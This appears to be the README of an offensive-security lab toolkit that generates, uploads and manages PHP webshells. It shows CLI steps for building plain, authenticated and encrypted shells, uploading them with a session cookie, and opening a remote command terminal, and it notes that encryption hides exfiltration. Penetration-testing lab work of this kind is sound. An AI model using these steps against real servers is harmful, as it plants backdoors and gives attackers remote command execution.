# ShellSuite

ShellSuite is a CLI-first webshell generation management and detection toolkit. Right now only **ShellShock**
(Webshell Creator + Webshell Manager) is implemented. `shellblock` is a placeholder for the
later detection modules and has no functionality yet.

Every capability is available from the command line. The Tkinter GUI is a thin
wrapper around the same CLI.

> **Lab use only.** Use ShellSuite only against systems you own or have explicit
> permission to test.

---

## Requirements

- Python **3.10 or newer**
- Tkinter for the GUI
  - Bundled with the Windows and macOS Python installers
  - On Debian/Ubuntu: `sudo apt install python3-tk`
- No third-party runtime dependencies

The generated webshells are PHP and are intended for the test lab (DVWA).

---

## Installation

### 1. Get the source

Clone the repository or copy the project folder

```
git clone https://github.com/ikey14/ShellSuite
```

Then open a terminal in the
project root (the directory containing `pyproject.toml`).

### 2. Create a virtual environment

Windows PowerShell:

```powershell
python -m venv .venv
.\.venv\Scripts\Activate.ps1
python -m pip install --upgrade pip
python -m pip install -e .
```

Linux / macOS:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
python -m pip install -e .
```

If PowerShell refuses to activate the environment, allow it for the current
terminal only:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\.venv\Scripts\Activate.ps1
```

### 3. Verify the installation

```powershell
shellsuite --version
```

Expected output: `shellsuite 0.1.0`.

If the `shellsuite` command is not available, use the module form:

```powershell
python -m shellsuite --version
```

## State directory

ShellSuite stores its persistent state under `~/.shellsuite` by default:

```text
~/.shellsuite/
├── registry.json      # known webshells and metadata
├── shells/            # generated webshells
├── sessions/          # per-session .jsonl transcripts
└── shellsuite.log
```

Override the location with the `SHELLSUITE_HOME` environment variable:

Windows PowerShell:

```powershell
$env:SHELLSUITE_HOME = "C:\path\to\shellsuite-state"
```

Linux / macOS:

```bash
export SHELLSUITE_HOME=/path/to/shellsuite-state
```

The registry contains the shell metadata and whether a secret exists. It never
stores the secret itself.

---

## Usage

General form:

```text
shellsuite [--version] [-v] <module> <action> [options]
```

Modules:

- `shock` — ShellShock: webshell creation and management
- `gui` — launch the graphical interface

Use `--help` (or `-h`) at any level:

```powershell
shellsuite shock --help
shellsuite shock create --help
shellsuite shock manage list --help
```

---

## ShellShock: Webshell Creator

A webshell type is defined by **vector × mode**:

| Vector | How the command is sent |
|---|---|
| `cookie` | HTTP Cookie header |
| `header` | HTTP header |
| `post` | POST body |

| Mode | Meaning |
|---|---|
| `plain` | No authentication |
| `auth` | Requires a secret |
| `encrypted` | Encrypts the payload; authentication is mandatory |

### Create a plain webshell

```powershell
shellsuite shock create --vector cookie --mode plain
```

The default output is:

```text
~/.shellsuite/shells/shell.php
```

Use `--out` to write somewhere else and `--name` to name your webshell:

```powershell
shellsuite shock create --vector post --mode plain --name dvwa-post --out .\dvwa-post.php
```

### Create an authenticated webshell
Authenticated webshells don't allow those who don't have the password to execute commands on the webshell.

```powershell
shellsuite shock create --vector cookie --mode auth --name dvwa-auth --secret "lab-password"
```

### Create an encrypted webshell
Encrypted webshells are like authenticated webshells with the added benefit of encrypting the communications. This makes data exfiltrations a bit trickier to catch.

```powershell
shellsuite shock create --vector header --mode encrypted --name dvwa-enc --secret "lab-password"
```

Encrypted mode always requires a secret. Plain mode must not receive one.

### PHP execution driver

The default driver is `shell_exec`. It can be changed with:

```powershell
shellsuite shock create --vector post --mode plain --name dvwa-system --driver system
```

Available drivers: `shell_exec`, `system`, `passthru`.

### Secret handling

The secret is embedded in the generated PHP file (not in plain text, as a hash). It is not stored in
`registry.json`. Avoid putting real credentials in shell history or command-line
arguments outside the lab. The GUI asks for passwords through a masked dialog
instead.

---

## ShellShock: Uploader

Upload a generated webshell to an endpoint:

```powershell
shellsuite shock upload --file dvwa-cookie.php --url http://<lab-host>/upload.php
```

`--file` may be:

- a filename relative to `~/.shellsuite/shells/`
- an absolute path

Common options:

```powershell
shellsuite shock upload `
  --file dvwa-cookie.php `
  --url http://<lab-host>/upload.php `
  --field uploaded `
  --filename dvwa-cookie.php `
  --cookie "PHPSESSID=<session>; security=low" `
  --header "X-Test: value" `
  --form "Upload=Upload"
```

| Option | Meaning |
|---|---|
| `--field` | multipart file field name (default `uploaded`). This should be the name of the input which takes files in the lab. |
| `--filename` | filename sent to the server (default: local basename) |
| `--cookie` | Cookie header. This is useful for when the upload endpoint needs user authentication. |
| `--header` | extra `Name: value` header; repeatable |
| `--form` | extra multipart form field; repeatable. Useful when an additional input (like a submit button) has to be hit to upload a file |
| `--timeout` | request timeout in seconds |

The command reports success when the endpoint returns HTTP 200. It also returns the url where the webshell was uploaded, as faulty cookies, robust authentication measures or something else
might redirect you to the login.

---

## ShellShock: Manager

It's important to note that everything in this module can be done via the GUI as well.
The GUI is a more user friendly and visually pleasing approach to webshell management.
There is an explanation for the GUI further down.

### Connect and register a webshell

```powershell
shellsuite shock manage connect `
  --url http://<lab-host>/hackable/uploads/dvwa-cookie.php `
  --vector cookie `
  --mode plain `
  --name dvwa-cookie
```

`connect` runs `id` by default and registers the shell in the registry if it manages to connect to the webshell. Use
`--command` to test another command:

```powershell
shellsuite shock manage connect `
  --url http://<lab-host>/hackable/uploads/dvwa-auth.php `
  --vector cookie `
  --mode auth `
  --secret "lab-password" `
  --name dvwa-auth `
  --command whoami
```

### List shells and sessions

```powershell
shellsuite shock manage list shells
shellsuite shock manage list sessions
```

Sort and filter:

```powershell
shellsuite shock manage list shells --order name --asc --filter "mode != plain"
shellsuite shock manage list sessions --order commands --desc --filter "commands > 50"
shellsuite shock manage list sessions --id <shell-id> --filter "started_at == 2026-10-25"
```

Shell fields:

```text
name, url, vector, mode, has_secret, created_at, last_used
```

Session fields:

```text
id, shell_id, shell, url, vector, mode, status,
started_at, ended_at, duration, commands
```

Add `--json` for machine-readable output.

### Show one shell or session

```powershell
shellsuite shock manage show shell --id <shell-id>
shellsuite shock manage show session --id <session-id>
```

### Edit a shell name

```powershell
shellsuite shock manage edit shell <shell-id> --name "DVWA low security"
shellsuite shock manage edit shell <shell-id> --clear-name
```

### Delete a shell or session

```powershell
shellsuite shock manage delete shell <shell-id>
shellsuite shock manage delete session --id <session-id>
```

Deleting a shell keeps its recorded sessions; the session title falls back to
the stored URL.

### Interactive terminal

```powershell
shellsuite shock manage terminal <shell-id>
```

For an authenticated or encrypted shell:

```powershell
shellsuite shock manage terminal <shell-id> --secret "lab-password"
```

Type `exit` or `quit` to close the terminal. Every command is recorded in a
session transcript. A failed command ends the terminal, matching the CLI’s
fail-fast behaviour.

---

## GUI

Launch it with:

```powershell
shellsuite gui
```

The GUI uses the same registry, shells and sessions as the CLI.

- **Shells** — list, filter, connect, rename, delete and open a terminal.
- **Sessions** — list recorded sessions, open a terminal for the shell, or
  double-click a session to read its transcript.
- **Filters** — choose a field, operator and value. Date fields open a calendar
  picker; selecting a day stores a `YYYY-MM-DD` value.
- **Terminal** — draw commands in the prompt, use `Up`/`Down` for history,
  `exit`/`quit` to close, and select output with the mouse.
- **Secrets** — auth/encrypted shells prompt for the password in a masked
  dialog. The password is passed to the CLI and never stored.

Everything the GUI does can also be done from the CLI.

---

## Filters

Operators:

```text
==   !=   contains   >   <
```

Filters are combined with **AND**:

```powershell
shellsuite shock manage list shells `
  --filter "mode != plain" `
  --filter "name contains dvwa"
```

Notes:

- `contains` is case-insensitive.
- `>` and `<` compare numbers numerically when possible:
  `commands > 50`, `duration < 30`.
- Date fields accept `YYYY-MM-DD`; a date matches the whole UTC day:
  `created_at == 2026-10-25`.
- Full ISO timestamps are compared as timestamps.
- Missing values (`ended_at` on an incomplete session) do not match date
  ranges.

Always quote filters containing `>` or `<` so the shell does not treat them as
redirections.

---

## Useful examples

```powershell
# Plain cookie shell
shellsuite shock create --vector cookie --mode plain --name lab-cookie

# Encrypted POST shell
shellsuite shock create --vector post --mode encrypted --name lab-enc --secret "lab-password"

# Upload with a lab session cookie
shellsuite shock upload --file lab-cookie.php --url http://<lab-host>/upload.php `
  --cookie "PHPSESSID=<session>; security=low"

# Register and verify
shellsuite shock manage connect --url http://<lab-host>/hackable/uploads/lab-cookie.php `
  --vector cookie --mode plain --name lab-cookie

# Find the busiest sessions
shellsuite shock manage list sessions --filter "commands > 50"

# Open a live terminal
shellsuite shock manage terminal <shell-id>
```

---

## Development checks

Run the test suite:

```powershell
python -m unittest discover -s tests
```

All tests are headless; the GUI is not opened by the test suite.
